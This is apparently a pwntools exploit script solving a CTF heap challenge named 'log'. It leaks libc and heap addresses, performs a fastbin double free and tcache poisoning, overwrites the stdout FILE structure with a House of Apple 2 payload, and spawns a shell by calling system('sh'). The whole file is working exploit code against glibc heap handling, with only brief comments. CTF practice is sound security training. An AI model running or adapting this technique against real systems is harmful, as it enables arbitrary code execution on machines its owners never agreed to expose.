#!/usr/bin/env python3

from pwn import *

elf = ELF("./log_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ('kgx', '-e')


def conn():
    global r
    if args.REMOTE:
        r = remote("log.challs.olicyber.it", 29006)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                breakrva 0x11FF

                                ignore 1 35
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(size: int, data: bytes):
    r.sendafter(b'> ', p32(0) + p32(size) + data)

def show(idx: int, limit: int) -> bytes:
    r.sendafter(b'> ', p32(1)+ p32(idx))
    r.recv(8) # skip optional message and size
    return r.recv(limit)

def free(idx: int):
    r.sendafter(b'> ', p32(2)+ p32(idx))


def main():
    r = conn()

    # leak libc address
    alloc(0x410, b'a'*0x410)
    free(0)
    libc.address = u64(show(0, 8)) - (libc.sym["main_arena"] + 96)
    log.success(f"Libc base: {hex(libc.address)}")

    SIZE = 0x70
    for i in range(9):
        alloc(SIZE, chr(ord('b')+i).encode()*SIZE)
    log.info(f"All chunks of size {hex(SIZE)} allocated")
    
    for i in range(7):
        free(1)
    log.info(f"Filled tcache bin for size {hex(SIZE+0x10)}")

    # fastbin dup (19 breakpoint hits)
    free(2)
    free(1)
    free(1)
    log.success(f"Double free in fastbin done")

    # (22 breakpoint hits)
    for i in range(8):
        alloc(SIZE, b'z'*SIZE)
    log.info(f"Tcache for size {hex(SIZE+0x10)} emptied")


    # leak heap base (30 breakpoint hits)
    alloc(0xf0, b't'*0xf0)
    alloc(0xf0, b't'*0xf0)
    free(19)
    heap_base = u64(show(19, 8)) << 12
    log.success(f"Heap base: {hex(heap_base)}")
    free(18)

    # alloc to sdout (35 breakpoint hits)
    alloc(SIZE, p64(((heap_base + 0x7e0) >> 12) ^ (heap_base + 0xa70)) + b'x'*(SIZE-0x8))
    alloc(SIZE, b'y'*SIZE)
    alloc(SIZE, b'z'*SIZE)
    alloc(SIZE, p64(((heap_base + 0x7e0) >> 12) ^ libc.sym['_IO_2_1_stdout_']) + b'w'*(SIZE-0x8))

    stdout_addr = libc.sym['_IO_2_1_stdout_']
    system_addr = libc.sym['system']
    wfile_jumps = libc.sym['_IO_wfile_jumps']

    # House of Apple 2 payload (Exactly 0xf0 / 240 bytes)
    payload = flat({
        0x00: b"  sh\x00\x00\x00\x00",      # fp->_flags (Command for system)
        0x28: p64(1),                       # fp->_IO_write_ptr (Must be > write_base to trigger flush)
    
        0x88: p64(stdout_addr + 0x40),   # fp->_lock, needs to be NULL 
    
        0xa0: p64(stdout_addr),            # fp->_wide_data 
    
        0xd8: p64(wfile_jumps),            # fp->vtable 
    
        0xe0: p64(stdout_addr + 0x80),     # fake _wide_vtable pointer
    
        # Wide vtable pointer + 0x68 -> 'doallocate' function.
        0xe8: p64(system_addr) 
    
    }, filler=b'\x00') # Gaps are filled with null bytes

    alloc(0xf0, b'.'*0xf0)
    alloc(0xf0, payload)

    r.interactive()


if __name__ == "__main__":
    main()
